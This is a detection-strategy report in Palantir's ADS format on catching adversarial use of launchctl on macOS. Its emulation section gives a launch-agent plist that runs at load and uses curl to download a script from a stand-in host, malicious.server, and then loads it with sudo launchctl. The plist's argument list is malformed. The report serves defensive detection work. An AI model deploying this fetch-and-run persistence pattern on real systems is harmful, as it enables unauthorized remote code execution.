# Palantir's Alerting & Detection Strategy (ADS) Report: Detecting Adversarial Use of Launchctl on macOS

## Goal
The objective of this technique is to detect adversarial attempts to use `launchctl` for executing malicious activities, which may involve bypassing security monitoring systems.

## Categorization
- **MITRE ATT&CK Mapping:** T1569.001 - Launchctl
- **Tactic / Kill Chain Phases:** Execution
- **Platforms:** macOS

[MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1569/001)

## Strategy Abstract
The detection strategy focuses on monitoring and analyzing the use of `launchctl` on macOS systems to identify unauthorized or malicious activities. Key data sources include:
- System logs (e.g., system.log, syslog)
- Process execution records

Patterns analyzed involve:
- Unusual `launchctl` commands executed with elevated privileges.
- Anomalies in job scheduling and management that do not align with typical user behavior.

## Technical Context
Adversaries may leverage `launchctl`, a command-line utility used to manage launchd jobs, to execute code with persistence or evade detection. In real-world scenarios, attackers exploit this by:
- Creating malicious launch agents or daemons.
- Using `launchctl` to start processes that avoid traditional security monitoring.

**Adversary Emulation Details:**
Sample commands for emulation might include:
```bash
sudo launchctl load /path/to/malicious.plist
```

**Test Scenario:**
1. Create a benign `.plist` file with unusual scheduling parameters.
2. Use `launchctl` to load the job and observe system behavior.

## Blind Spots and Assumptions
- **Limitations:** Detection might not cover all variations of malicious payloads or obfuscated code within launchd configurations.
- **Assumptions:** Assumes that benign use of `launchctl` follows typical user patterns, which may vary across organizations.

## False Positives
Potential benign activities that could trigger false alerts include:
- Legitimate administrative tasks using `launchctl`.
- Scheduled jobs created by system updates or standard software installations.

## Priority
**Severity: Medium**

**Justification:** While not as common as other attack vectors on macOS, the misuse of `launchctl` can provide persistence and evasion capabilities to adversaries, making it a significant threat if left undetected.

## Validation (Adversary Emulation)
### Step-by-Step Instructions:
1. **Environment Setup:**
   - Prepare a macOS test environment with standard security tools enabled.
   
2. **Create Malicious `.plist` File:**
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
   <plist version="1.0">
     <dict>
       <key>Label</key>
       <string>com.example.malicious</string>
       <key>ProgramArguments</key>
       <array>
         <string>/usr/bin/curl</string>
         <string>-s</string>
         <string>-o</string>
         <string>/tmp/malicious_payload.sh</string>
         <string>http://malicious.server/script.sh</string>
         <string>/bin/bash</string>
         <string>/tmp/malicious_payload.sh</string>
       </array>
       <key>RunAtLoad</key>
       <true/>
     </dict>
   </plist>
   ```

3. **Execute Command:**
   ```bash
   sudo launchctl load /path/to/com.example.malicious.plist
   ```

4. **Monitor System Logs:**
   - Check for unusual process starts or network activity following the execution.

## Response
When an alert is triggered:
- Immediately isolate the affected system.
- Analyze logs to identify the source and nature of `launchctl` usage.
- Review all loaded launchd jobs for suspicious entries.
- Remove any identified malicious configurations using:
  ```bash
  sudo launchctl unload /path/to/com.example.malicious.plist
  ```
